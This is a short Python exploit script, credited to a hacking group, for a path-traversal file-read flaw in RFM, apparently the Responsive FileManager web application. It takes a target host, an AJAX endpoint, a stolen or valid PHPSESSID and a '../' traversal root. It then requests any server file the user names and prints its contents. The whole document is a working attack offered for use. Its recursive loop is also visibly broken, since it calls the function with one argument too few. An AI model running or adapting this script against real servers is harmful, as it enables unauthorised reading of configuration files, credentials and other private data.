#!/usr/bin/python
import requests

def exploit_rfm(root,target,ajax,session):
	#root = "../../../../../../../../"
	fileread   = input("File Path >> ")
	path   = {'path':root+fileread}
	cookie = {'PHPSESSID':session}
	url    = "http://"+target+ajax+"?action=get_file&sub_action=edit&preview_mode=text"
	r  	   = requests.post(url, cookies=cookie, data=path)
	print(r.text)
	exploit_rfm(target, ajax, session)

print("""################# | Coded by FilthyRoot
# RFM File Read # | Github : Sora Cyber Team
################# | Copyright (c) 2019 Jogjakarta Hacker Link""")

target 	  = input("Target 	  : http://")
ajax_call = input("Ajax_Call : ")
session	  = input("PHPSESSID : ")
root 	  = input("Root      : ")
exploit_rfm(root,target,ajax_call,session)